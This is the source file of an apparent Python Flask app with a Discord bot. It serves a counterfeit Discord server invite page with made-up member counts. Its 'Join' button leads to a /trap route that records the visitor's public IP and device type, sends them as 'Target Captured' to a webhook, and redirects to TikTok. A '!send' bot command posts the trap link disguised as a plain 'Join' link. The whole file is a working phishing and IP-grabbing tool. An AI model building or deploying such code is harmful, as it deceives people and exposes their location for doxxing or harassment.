# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, redirect

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
# ---------------------

FAKE_JOIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <meta property="og:title" content="BRXXKS">
    <meta property="og:description" content="BRXXKS Official Community Server!">
    <meta property="og:image" content="https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #313338; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .embed { background-color: #2b2d31; width: 432px; border-radius: 4px; overflow: hidden; border-left: 4px solid #4f545c; display: flex; flex-direction: column; }
        .banner { width: 100%; height: 120px; object-fit: cover; }
        .content { padding: 16px; position: relative; }
        .icon { width: 80px; height: 80px; border-radius: 50%; border: 6px solid #2b2d31; background-color: #000; position: absolute; top: -40px; left: 16px; object-fit: cover; }
        .title-row { margin-top: 40px; display: flex; align-items: center; gap: 8px; }
        .title { color: #f2f3f5; font-size: 20px; font-weight: 600; }
        .badges { display: flex; gap: 4px; }
        .badge { height: 20px; }
        .stats { color: #b5bac1; font-size: 14px; margin-top: 8px; display: flex; align-items: center; gap: 12px; }
        .dot { height: 8px; width: 8px; background-color: #23a55a; border-radius: 50%; display: inline-block; margin-right: 4px; }
        .dot.grey { background-color: #80848e; }
        .desc { color: #dbdee1; font-size: 14px; margin-top: 16px; line-height: 1.4; }
        .btn { background-color: #248046; color: #fff; border: none; padding: 10px; font-size: 14px; border-radius: 3px; cursor: pointer; width: 100%; font-weight: 500; transition: 0.2s; margin-top: 16px; text-align: center; text-decoration: none; display: block; }
        .btn:hover { background-color: #1a6334; }
    </style>
</head>
<body>
    <div class="embed">
        <img src="https://cdn.discordapp.com/banners/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=600" class="banner" alt="Banner">
        <div class="content">
            <img src="https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=128" class="icon" alt="Icon">
            <div class="title-row">
                <div class="title">BRXXKS</div>
                <div class="badges">
                    <svg class="badge" viewBox="0 0 24 24" fill="#5865F2"><path d="M12 0L14.59 3.41L18.94 2.85L19.97 7.1L23.79 9.25L22.15 13.32L24 17.24L20.41 19.57L19.04 23.69L14.7 22.84L11.75 25.85L9.12 22.47L4.78 23.42L3.51 19.38L0 16.9L1.84 12.95L0 9L3.51 6.52L4.78 2.48L9.12 3.43L11.75 0H12Z"></path><path fill="#fff" d="M9.99 16.22L6.61 12.84L8.02 11.43L9.99 13.4L15.98 7.41L17.39 8.82L9.99 16.22Z"></path></svg>
                    <img class="badge" src="https://i.imgur.com/8QOq4w9.jpeg" alt="BRXK">
                </div>
            </div>
            <div class="stats">
                <span><span class="dot"></span>7,054 Online</span>
                <span><span class="dot grey"></span>147,903 Members</span>
            </div>
            <div class="stats" style="margin-top: 4px;">Est. Aug 2023</div>
            <div class="desc">
                BRXXKS Official Community Server!<br><br>
                🗡️🔥 🛡️🔥
            </div>
            
            <a href="/trap" class="btn">Join</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(FAKE_JOIN_HTML)

@app.route('/trap')
def trap():
    # Grab the IP
    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                {"name": "Method", "value": "```Widget Link Click```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    
    # Redirect to TikTok after grab
    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # This masks the link. They see "Join", but it goes to your Railway trap.
    trap_link = f"[Join]({RAILWAY_URL})"
    await ctx.send(f"Come hang out: {trap_link}")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
